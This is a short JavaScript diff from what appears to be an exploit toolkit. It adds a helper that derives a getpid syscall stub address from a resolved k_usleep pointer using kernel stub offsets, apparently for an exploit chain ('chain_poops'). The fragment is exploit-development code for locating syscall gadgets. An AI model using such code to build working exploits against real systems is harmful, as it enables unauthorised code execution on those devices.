@@ -188,6 +188,13 @@ function fnGetpidDelta(off) {
     return (off.k_stubs[20] - off.k_usleep) >>> 0;
 }
 
+/** getpid stub addr from accepted k_usleep fn — 0 reads (chain_poops table RVAs). */
+export function getpidStubFromFn(fnPtr, off) {
+    const delta = fnGetpidDelta(off);
+    if (!fnPtr || delta == null) return null;
+    return fnPtr.add32(delta);
+}
+
 function scanGetpidNearFn(p, fnPtr, lk, off, radius, maxProbes) {
     const delta = fnGetpidDelta(off);
     if (!p || !fnPtr || delta == null) return null;
